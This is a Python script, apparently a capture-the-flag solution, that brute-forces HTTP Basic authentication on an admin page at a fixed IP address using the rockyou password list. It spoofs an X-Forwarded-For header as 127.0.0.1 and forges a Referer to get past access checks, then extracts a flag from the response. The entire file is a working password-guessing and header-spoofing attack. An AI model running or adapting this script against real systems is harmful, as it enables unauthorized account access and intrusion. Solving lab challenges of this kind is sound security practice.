from base64 import b64encode
import requests
from bs4 import BeautifulSoup
from requests.exceptions import ReadTimeout, ConnectTimeout

login_url = 'http://140.115.59.7:12002/admin'
login_headers = {
    "Host": "140.115.59.7:12002",
    "Referer": "https://www.adlSecurity.com", # Step 3
    "X-Forwarded-For": "127.0.0.1",  # Step 2
    "Authorization": None,
}


def set_login(username, password):
    authorization = b64encode(f"{username}:{password}".encode('utf-8')).decode('ascii')
    login_headers["Authorization"] = f"Basic {authorization}"

count = 0
with open('rockyou.txt', 'r', encoding='latin-1') as rockyou:
    for line in rockyou:
        count += 1
        line = line.strip()
        print(f"try {count} password: {line}")
        set_login("hitori", line)
        while True:
            try:
                response = requests.request(
                    method="GIVEMEFLAG", 
                    url=login_url, 
                    headers=login_headers, 
                    timeout=1
                )
                break
            except ReadTimeout:
                print("read timeout, retry")
            except ConnectTimeout:
                print("connect timeout, retry")
        
        if response.status_code == 200:
        # if 'You have not been verified' not in response.text:
            print(f"found password!: {line}")
            with open('output.txt', 'w') as output_file:
                output_file.write(f"found password!: {line}\n")  # Write to file
            soup = BeautifulSoup(response.text, 'html.parser')
            tag_content = soup.find('code').text.strip()
            print("Content within <code> tags:")
            print(tag_content)
            break
        # time.sleep(0.5)
